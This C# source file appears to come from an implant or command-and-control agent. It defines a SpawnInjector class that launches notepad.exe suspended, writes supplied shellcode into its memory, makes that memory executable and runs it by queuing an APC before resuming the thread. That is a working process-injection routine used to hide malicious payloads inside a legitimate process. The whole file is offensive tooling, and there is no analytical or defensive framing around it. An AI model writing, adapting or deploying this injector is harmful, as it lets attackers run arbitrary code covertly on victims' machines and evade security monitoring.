﻿using System;
using System.Runtime.InteropServices;

namespace Agent.Internal
{
    public class SpawnInjector : Injector
    {
        public override bool Inject(byte[] shellcode, int pid = 0)
        {
            var pa = new Native.Kernel32.SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);

            var ta = new Native.Kernel32.SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            var si = new Native.Kernel32.STARTUPINFO();

            if (!Native.Kernel32.CreateProcess(@"C:\Windows\System32\notepad.exe", null,
                ref pa, ref ta,
                false, Native.Kernel32.CreationFlags.CreateSuspended,
                IntPtr.Zero, @"C:\Windows\System32", ref si, out var pi))
            {
                return false;
            }

            var baseAddress = Native.Kernel32.VirtualAllocEx(
                pi.hProcess,
                IntPtr.Zero,
                shellcode.Length,
                Native.Kernel32.AllocationType.Commit | Native.Kernel32.AllocationType.Reserve,
                Native.Kernel32.MemoryProtection.ReadWrite);

            Native.Kernel32.WriteProcessMemory(
                pi.hProcess,
                baseAddress,
                shellcode,
                shellcode.Length,
                out _);

            Native.Kernel32.VirtualProtectEx(
                pi.hProcess,
                baseAddress,
                shellcode.Length,
                Native.Kernel32.MemoryProtection.ExecuteRead,
                out _);

            Native.Kernel32.QueueUserAPC(baseAddress, pi.hThread, 0);
            
            var result = Native.Kernel32.ResumeThread(pi.hThread);
            return result > 0;
        }
    }
}
